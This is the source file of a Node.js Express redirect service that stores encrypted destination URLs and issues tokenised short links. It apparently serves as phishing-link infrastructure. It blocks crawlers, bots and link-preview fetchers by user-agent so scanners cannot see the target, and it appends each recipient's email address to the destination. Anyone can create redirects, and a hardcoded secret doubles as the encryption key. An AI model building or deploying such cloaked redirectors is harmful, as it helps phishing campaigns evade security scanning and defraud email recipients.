const express = require('express');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const Database = require('better-sqlite3');

const app = express();
const PORT = process.env.PORT || 3000;

const JWT_SECRET = 'your_strong_secret_key'; // Replace this with a secure key
const ENCRYPTION_KEY = crypto.createHash('sha256').update(JWT_SECRET).digest();
const IV_LENGTH = 16;

const dbPath = process.env.RENDER ? '/tmp/redirects.db' : './redirects.db';
const db = new Database(dbPath);

// Create redirects table if not exists
db.prepare(`
  CREATE TABLE IF NOT EXISTS redirects (
    key TEXT PRIMARY KEY,
    token TEXT NOT NULL,
    destination TEXT NOT NULL
  )
`).run();

app.use(express.static('public'));
app.use(express.json());

// Rate limiter middleware
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  message: 'Too many requests. Please try again later.',
});
app.use(limiter);

function encrypt(text) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return `${iv.toString('hex')}:${encrypted}`;
}

function decrypt(encryptedText) {
  const [ivHex, encryptedData] = encryptedText.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function generateUniqueKey() {
  return crypto.randomBytes(8).toString('hex');
}

function generateToken(key) {
  return jwt.sign({ key }, JWT_SECRET);
}

// Add a new redirect
app.post('/add-redirect', (req, res) => {
  const { destination } = req.body;

  if (!destination || !/^https?:\/\//.test(destination)) {
    return res.status(400).json({ message: 'Invalid destination URL.' });
  }

  const key = generateUniqueKey();
  const token = generateToken(key);

  // Encrypt destination before storing
  const encryptedDestination = encrypt(destination);

  // Insert into DB
  const stmt = db.prepare('INSERT INTO redirects (key, token, destination) VALUES (?, ?, ?)');
  try {
    stmt.run(key, token, encryptedDestination);
  } catch (err) {
    console.error('DB insert error:', err);
    return res.status(500).json({ message: 'Internal server error.' });
  }

  const baseUrl = req.protocol + '://' + req.get('host');

  res.json({
    message: 'Redirect added successfully!',
    redirectUrl: `${baseUrl}/${key}?token=${token}`,
    pathRedirectUrl: `${baseUrl}/${key}/${token}`,
  });
});

// Handle redirect with token and optional email
app.get('/:key/:token/:email?', (req, res) => {
  const { key, token, email: emailFromPath } = req.params;
  const emailFromQuery = req.query.email;
  let email = emailFromPath || emailFromQuery;

  if (email) {
    try {
      email = decodeURIComponent(email);
    } catch {
      return res.status(400).send('Invalid email encoding.');
    }
  }

  const userAgent = req.headers['user-agent'] || '';
  if (/bot|crawl|spider|preview/i.test(userAgent)) {
    return res.status(403).send('Access denied.');
  }

  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).send('Invalid email format.');
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.key !== key) throw new Error('Invalid token');

    // Fetch from DB
    const row = db.prepare('SELECT destination FROM redirects WHERE key = ?').get(key);
    if (!row) return res.status(404).send('Redirect not found.');

    const destination = decrypt(row.destination);

    let finalUrl = destination;
    if (email) {
      finalUrl += destination.endsWith('/') ? email : `/${email}`;
    }

    res.redirect(finalUrl);
  } catch (err) {
    console.error('Redirect error:', err);
    res.status(403).send('Invalid or expired token.');
  }
});

// Handle redirect with token only (no email)
app.get('/:key/:token', (req, res) => {
  const { key, token } = req.params;

  const userAgent = req.headers['user-agent'] || '';
  if (/bot|crawl|spider|preview/i.test(userAgent)) {
    return res.status(403).send('Access denied.');
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.key !== key) throw new Error('Invalid token');

    const row = db.prepare('SELECT destination FROM redirects WHERE key = ?').get(key);
    if (!row) return res.status(404).send('Redirect not found.');

    const destination = decrypt(row.destination);
    res.redirect(destination);
  } catch {
    res.status(403).send('Invalid or expired token.');
  }
});

// Catch all for invalid routes
app.use((req, res) => {
  res.status(404).send('Error: Invalid request.');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
